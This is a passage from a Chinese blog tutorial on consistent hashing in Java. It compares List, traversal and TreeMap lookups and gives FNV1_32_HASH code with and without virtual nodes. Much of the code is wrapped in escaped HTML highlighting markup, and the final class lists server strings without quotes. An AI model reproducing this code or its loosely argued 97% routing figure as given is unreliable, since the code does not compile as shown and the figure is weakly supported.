之后，待路由的结点，只需要在List中找到第一个Hash值比它大的服务器节点就可以了，比如服务器节点的Hash值是[0,2,4,6,8,10]，带路由的结点是7，只需要找到第一个比7大的整数，也就是8，就是我们最终需要路由过去的服务器节点。 如果暂时不考虑前面的排序，那么这种解决方案的时间复杂度： （1）最好的情况是第一次就找到，时间复杂度为O(1) （2）最坏的情况是最后一次才找到，时间复杂度为O(N) 平均下来时间复杂度为O(0.5N+0.5)，忽略首项系数和常数，时间复杂度为O(N)。 但是如果考虑到之前的排序，我在网上找了张图，提供了各种排序算法的时间复杂度。 看得出来，排序算法要么稳定但是时间复杂度高、要么时间复杂度低但不稳定，看起来最好的归并排序法的时间复杂度仍然有O(N * logN)，稍微耗费性能了一些。 2、解决方案二：遍历+List 既然排序操作比较耗性能，那么能不能不排序？可以的，所以进一步的，有了第二种解决方案。 解决方案使用List不变，不过可以采用遍历的方式： （1）服务器节点不排序，其Hash值全部直接放入一个List中 （2）待路由的节点，算出其Hash值，由于指明了”顺时针”，因此遍历List，比待路由的节点Hash值大的算出差值并记录，比待路由节点Hash值小的忽略 （3）算出所有的差值之后，最小的那个，就是最终需要路由过去的节点 在这个算法中，看一下时间复杂度： 1、最好情况是只有一个服务器节点的Hash值大于带路由结点的Hash值，其时间复杂度是O(N)+O(1)=O(N+1)，忽略常数项，即O(N) 2、最坏情况是所有服务器节点的Hash值都大于带路由结点的Hash值，其时间复杂度是O(N)+O(N)=O(2N)，忽略首项系数，即O(N) 所以，总的时间复杂度就是O(N)。其实算法还能更改进一些：给一个位置变量X，如果新的差值比原差值小，X替换为新的位置，否则X不变。这样遍历就减少了一轮，不过经过改进后的算法时间复杂度仍为O(N)。 总而言之，这个解决方案和解决方案一相比，总体来看，似乎更好了一些。 3、解决方案三：二叉查找树 抛开List这种数据结构，另一种数据结构则是使用二叉查找树。 当然我们不能简单地使用二叉查找树，因为可能出现不平衡的情况。平衡二叉查找树有AVL树、红黑树等，这里使用红黑树，选用红黑树的原因有两点： 1、红黑树主要的作用是用于存储有序的数据，这其实和第一种解决方案的思路又不谋而合了，但是它的效率非常高 2、JDK里面提供了红黑树的代码实现TreeMap和TreeSet 另外，以TreeMap为例，TreeMap本身提供了一个tailMap(K fromKey)方法，支持从红黑树中查找比fromKey大的值的集合，但并不需要遍历整个数据结构。 使用红黑树，可以使得查找的时间复杂度降低为O(logN)，比上面两种解决方案，效率大大提升。 为了验证这个说法，我做了一次测试，从大量数据中查找第一个大于其中间值的那个数据，比如10000数据就找第一个大于5000的数据（模拟平均的情况）。看一下O(N)时间复杂度和O(logN)时间复杂度运行效率的对比： 因为再大就内存溢出了，所以只测试到4000000数据。可以看到，数据查找的效率，TreeMap是完胜的，其实再增大数据测试也是一样的，红黑树的数据结构决定了任何一个大于N的最小数据，它都只需要几次至几十次查找就可以查到。 当然，明确一点，有利必有弊，根据我另外一次测试得到的结论是，为了维护红黑树，数据插入效率TreeMap在三种数据结构里面是最差的，且插入要慢上5~10倍。 Hash值重新计算 服务器节点我们肯定用字符串来表示，比如”192.168.1.1″、”192.168.1.2″，根据字符串得到其Hash值，那么另外一个重要的问题就是Hash值要重新计算，这个问题是我在测试String的hashCode()方法的时候发现的，不妨来看一下为什么要重新计算Hash值： /** * String的hashCode()方法运算结果查看 * @author 哓哓 * */ public class StringHashCodeTest { public static void main(String[] args) { System.out.println(&quot;192.168.0.0:111的哈希值：&quot; + &quot;192.168.0.0:1111&quot;.hashCode()); System.out.println(&quot;192.168.0.1:111的哈希值：&quot; + &quot;192.168.0.1:1111&quot;.hashCode()); System.out.println(&quot;192.168.0.2:111的哈希值：&quot; + &quot;192.168.0.2:1111&quot;.hashCode()); System.out.println(&quot;192.168.0.3:111的哈希值：&quot; + &quot;192.168.0.3:1111&quot;.hashCode()); System.out.println(&quot;192.168.0.4:111的哈希值：&quot; + &quot;192.168.0.4:1111&quot;.hashCode()); } } 我们在做集群的时候，集群点的IP以这种连续的形式存在是很正常的。看一下运行结果为： 192.168.0.0:111的哈希值：1845870087 192.168.0.1:111的哈希值：1874499238 192.168.0.2:111的哈希值：1903128389 192.168.0.3:111的哈希值：1931757540 192.168.0.4:111的哈希值：1960386691 这个就问题大了，[0,2^32-1]的区间之中，5个HashCode值却只分布在这么小小的一个区间，什么概念？[0,2^32-1]中有4294967296个数字，而我们的区间只有122516605，从概率学上讲这将导致97%待路由的服务器都被路由到”192.168.0.1″这个集群点上，简直是糟糕透了！ 另外还有一个不好的地方：规定的区间是非负数，String的hashCode()方法却会产生负数（不信用”192.168.1.0:1111″试试看就知道了）。不过这个问题好解决，取绝对值就是一种解决的办法。 综上，String重写的hashCode()方法在一致性Hash算法中没有任何实用价值，得找个算法重新计算HashCode。这种重新计算Hash值的算法有很多，比如CRC32_HASH、FNV1_32_HASH、KETAMA_HASH等，其中KETAMA_HASH是默认的MemCache推荐的一致性Hash算法，用别的Hash算法也可以，比如FNV1_32_HASH算法的计算效率就会高一些。 一致性Hash算法：CRC32_HASH、KETAMA_HASH、FNV1_32_HASH、NATIVE_HASH、MYSQL_HASH 一致性Hash算法实现版本1：不带虚拟节点 使用一致性Hash算法，尽管增强了系统的伸缩性，但是也有可能导致负载分布不均匀，解决办法就是使用虚拟节点代替真实节点，第一个代码版本，先来个简单的，不带虚拟节点。 下面来看一下不带虚拟节点的一致性Hash算法的Java代码实现： /** * 不带虚拟结点的一致性Hash算法 * @author 哓哓 * */ public class ConsistentHashWithoutVN { &lt;span class=&quot;cm&quot;&gt;/** * 待加入Hash环的服务器列表 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.0.0:111&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.0.1:111&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.0.2:111&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;192.168.0.3:111&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;  t t&lt;span class=&quot;s&quot;&gt;&quot;192.168.0.4:111&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * key表示服务器的hash值，value表示服务器的名称 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedMap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TreeMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;();&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * 程序初始化，将所有服务器加入集合 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]);&lt;/span&gt;  t t &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;]加入集群中, 其Hash值为&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t  &lt;span class=&quot;n&quot;&gt;sortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]);&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * 使用FNV1_32_HASH算法计算hash值 * @param str * @return */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16777619&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2166136261L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 如果算出来的值为负数则取其绝对值&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;matchServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 待路由结点的Hash值&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 得到大于该Hash值的子Map&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;SortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subMap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;tailMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 顺时针的第一个Key&lt;/span&gt;  t&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;firstKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;// 返回路由到的服务器名称&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t  t&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1:1111&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;221.226.0.1:2222&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.211.0.1:3333&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;]的hash值为&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,被路由到的服务器为[&quot;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matchServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 可以运行一下看一下结果： [192.168.0.0:111]加入集合中, 其Hash值为575774686 [192.168.0.1:111]加入集合中, 其Hash值为8518713 [192.168.0.2:111]加入集合中, 其Hash值为1361847097 [192.168.0.3:111]加入集合中, 其Hash值为1171828661 [192.168.0.4:111]加入集合中, 其Hash值为1764547046[127.0.0.1:1111]的hash值为380278925, 被路由到结点[192.168.0.0:111] [221.226.0.1:2222]的hash值为1493545632, 被路由到结点[192.168.0.4:111] [10.211.0.1:3333]的hash值为1393836017, 被路由到结点[192.168.0.4:111] 看到经过FNV1_32_HASH算法重新计算过后的Hash值，就比原来String的hashCode()方法好多了。从运行结果来看，也没有问题，三个点路由到的都是顺时针离他们Hash值最近的那台服务器上。 使用虚拟节点来改善一致性Hash算法 上面的一致性Hash算法实现，可以在很大程度上解决很多分布式环境下不好的路由算法导致系统伸缩性差的问题，但是会带来另外一个问题：负载不均。 比如说有Hash环上有A、B、C三个服务器节点，分别有100个请求会被路由到相应服务器上。现在在A与B之间增加了一个节点D，这导致了原来会路由到B上的部分节点被路由到了D上，这样A、C上被路由到的请求明显多于B、D上的，原来三个服务器节点上均衡的负载被打破了。某种程度上来说，这失去了负载均衡的意义，因为负载均衡的目的本身就是为了使得目标服务器均分所有的请求。 解决这个问题的办法是引入虚拟节点，其工作原理是：**将一个物理节点拆分为多个虚拟节点，并且同一个物理节点的虚拟节点尽量均匀分布在Hash环上。**采取这样的方式，就可以有效地解决增加或减少节点时候的负载不均衡的问题。 至于一个物理节点应该拆分为多少虚拟节点，下面可以先看一张图： 横轴表示需要为每台福利服务器扩展的虚拟节点倍数，纵轴表示的是实际物理服务器数。可以看出，物理服务器很少，需要更大的虚拟节点；反之物理服务器比较多，虚拟节点就可以少一些。比如有10台物理服务器，那么差不多需要为每台服务器增加100~200个虚拟节点才可以达到真正的负载均衡。 一致性Hash算法实现版本2：带虚拟节点 在理解了使用虚拟节点来改善一致性Hash算法的理论基础之后，就可以尝试开发代码了。编程方面需要考虑的问题是： 1、一个真实结点如何对应成为多个虚拟节点？ 2、虚拟节点找到后如何还原为真实结点？ 这两个问题其实有很多解决办法，我这里使用了一种简单的办法，给每个真实结点后面根据虚拟节点加上后缀再取Hash值，比如”192.168.0.0:111″就把它变成”192.168.0.0:111&amp;&amp;VN0″到”192.168.0.0:111&amp;&amp;VN4″，VN就是Virtual Node的缩写，还原的时候只需要从头截取字符串到”&amp;&amp;”的位置就可以了。 下面来看一下带虚拟节点的一致性Hash算法的Java代码实现： /** * 带虚拟结点的一致性Hash算法 * * @author 哓哓 * */ public class ConsistentHashWithVN {  t/**  t * 待加入Hash环的服务器列表  t */  tprivate static String[] servers = { 192.168.0.0:111, 192.168.0.1:111, 192.168.0.2:111, 192.168.0.3:111,  t t t192.168.0.4:111 }; &lt;span class=&quot;cm&quot;&gt;/** * 真实结点列表，考虑到服务器上线、下线的场景，即添加、删除的场景会比较频繁，这里使用LinkedList会更好 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;realNodes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 